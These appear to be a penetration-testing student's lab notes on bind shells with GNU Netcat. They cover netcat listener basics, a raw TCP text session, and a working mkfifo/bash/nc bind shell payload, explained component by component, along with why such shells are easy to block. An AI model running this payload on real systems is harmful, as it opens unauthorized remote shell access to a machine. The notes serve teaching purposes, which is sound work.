# 1️⃣ What Is a Bind Shell?

In many cases, we will be working to establish a shell on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell.

This is typically done by using a:

- **Bind Shell**
    
- **Reverse Shell**
    

---

## 🔹 What Is It?

With a **bind shell**, the target system:

- Starts a listener
    
- Waits for an incoming connection
    
- The pentester (attacker) connects to that open port
    

---

## 📊 Bind Shell Diagram

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://miro.medium.com/1%2Ak5kQuDcgISOgpDNuD36MEQ.jpeg)

![Image](https://www.akamai.com/site/en/images/blog/2024/october-cups-ddos-threat-three.png)

![Image](https://www.uptycs.com/hubfs/visual-studio-code-remote-code-execution-vulnerability-cve-2022-41034-e.png)

Example scenario:

- Pentester (Attack Box): `10.10.14.15`
    
- Target: `10.10.14.20`
    
- Listening Port: `1337`
    

The attacker connects directly to the IP and listening port on the target.

---

# 2️⃣ Challenges with Bind Shells

There are many challenges associated with getting a shell this way:

- There must already be a listener started on the target.
    
- If no listener exists, we must find a way to make this happen.
    
- Admins typically configure strict incoming firewall rules.
    
- NAT (with PAT implementation) is usually configured on public-facing networks.
    
- Operating system firewalls (Windows & Linux) block most incoming connections.
    
- IDS/IPS may detect unusual listening ports.
    

⚠ Bind shells are easier to defend against because the connection is incoming.

---

# 3️⃣ GNU Netcat (nc)

The tool used in this example is **GNU Netcat**.

Netcat is considered our:

> 🛠 Swiss-Army Knife of networking

Capabilities:

- Works over TCP
    
- Works over UDP
    
- Supports Unix sockets
    
- Supports IPv4 & IPv6
    
- Opens and listens on sockets
    
- Can act as a proxy
    
- Handles text input/output
    

We use:

- `nc` on the attack box → Client
    
- `nc` on the target → Server
    

---

# 4️⃣ Practicing with GNU Netcat (Basic TCP Session)

Scenario:

- Target: Ubuntu Linux
    
- Same network
    
- No restrictions
    

---

## 🖥 Step 1 – Server (Target) Starts Listener

On the target:

```bash
nc -lvnp 7777
```

Output:

```bash
Listening on [0.0.0.0] (family 0, port 7777)
```

Breakdown:

- `-l` → Listen
    
- `-v` → Verbose
    
- `-n` → No DNS resolution
    
- `-p` → Port
    

---

## 🖥 Step 2 – Client (Attack Box) Connects

On attack box:

```bash
nc -nv 10.129.41.200 7777
```

Output:

```bash
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

---

## 🖥 Step 3 – Server Receives Connection

```bash
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

---

## 🔎 Important

This is NOT a proper shell.

It is just a **raw TCP session**.

We are only passing text between two systems.

---

## 🖥 Step 4 – Sending Text

Client types:

```bash
Hello Academy
```

Server receives:

```bash
Hello Academy
```

---

## 📊 Netcat Text Communication Flow

![Image](https://www.ionos.com/digitalguide/fileadmin/DigitalGuide/Screenshots_2020/netcat-5.png)

![Image](https://home.cc.umanitoba.ca/~psgendb/nc/thinclient.gif)

![Image](https://docs.vultr.com/public/doc-assets/2012/778f787e-94ce-4505-ac11-22066b586a6a.png)

This demonstrates:

- Bidirectional text pipe
    
- No shell interaction
    
- No OS control
    

---

# 5️⃣ Establishing a Real Bind Shell

Now we serve a real shell over TCP.

On the **server (target)**:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

---

## 🔍 Breaking Down the Payload

This entire command is our **payload**.

### Components:

- `rm -f /tmp/f`  
    Remove old named pipe if exists
    
- `mkfifo /tmp/f`  
    Create named pipe
    
- `cat /tmp/f`  
    Read input from pipe
    
- `/bin/bash -i`  
    Start interactive Bash shell
    
- `2>&1`  
    Redirect stderr to stdout
    
- `nc -l 10.129.41.200 7777`  
    Listen on IP and port
    
- `> /tmp/f`  
    Send output back into pipe
    

This creates a loop between:

- Netcat
    
- Named pipe
    
- Bash
    

---

## 🖥 Client Connects to Bind Shell

On attack box:

```bash
nc -nv 10.129.41.200 7777
```

Now you will see:

```bash
Target@server:~$
```

You now have:

✅ Real shell access  
✅ OS command execution  
✅ File system access

---

## 📊 Bind Shell with Bash Flow

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1040/0%2AgCB19x1UCW84P0dW.jpg)

![Image](https://www.varonis.com/hubfs/Imported_Blog_Media/netcat-commands-port-scan-2.png?hsLang=en)

![Image](https://blog.ropnop.com/images/2017/07/oops_ctrl_c.png)

---

# 6️⃣ Why This Worked

In this lab:

- We controlled both systems.
    
- No firewall restrictions.
    
- No NAT blocking inbound traffic.
    
- No IDS/IPS.
    
- No endpoint protection.
    
- No authentication restrictions.
    

This is NOT realistic in real-world engagements.

This was done to understand:

- How bind shells work
    
- How Netcat operates
    
- How shell redirection functions
    
- How payloads are structured
    

---

# 7️⃣ Why Bind Shells Are Easier to Defend Against

Because:

- Connection is incoming.
    
- Most networks block unsolicited inbound traffic.
    
- OS firewalls block unknown listeners.
    
- IDS/IPS detect suspicious open ports.
    
- EDR flags suspicious listening processes.
    

Even if using standard ports like:

- 80
    
- 443
    

It may still be detected.

---

# 8️⃣ Bind Shell Summary

|Feature|Bind Shell|
|---|---|
|Listener Location|Target|
|Connection Direction|Attacker → Target|
|Firewall Friendly|❌ No|
|Detection Risk|High|
|Common in Real World|Less common|

---

# 9️⃣ Key Takeaways for Pentesters

✔ Understand how listeners work  
✔ Understand port binding  
✔ Know how to use `nc` properly  
✔ Understand redirection (`2>&1`)  
✔ Understand named pipes (`mkfifo`)  
✔ Recognize when a shell is NOT interactive  
✔ Know why bind shells fail in real networks

---

# 🔟 Concept Flow

```text
Target → Opens Listener
Attacker → Connects to Target
Netcat → Bridges TCP Session
Bash → Serves Interactive Shell
```

---

In the next section, reverse shells will show how attackers bypass inbound firewall restrictions by making the victim initiate the connection instead.

---
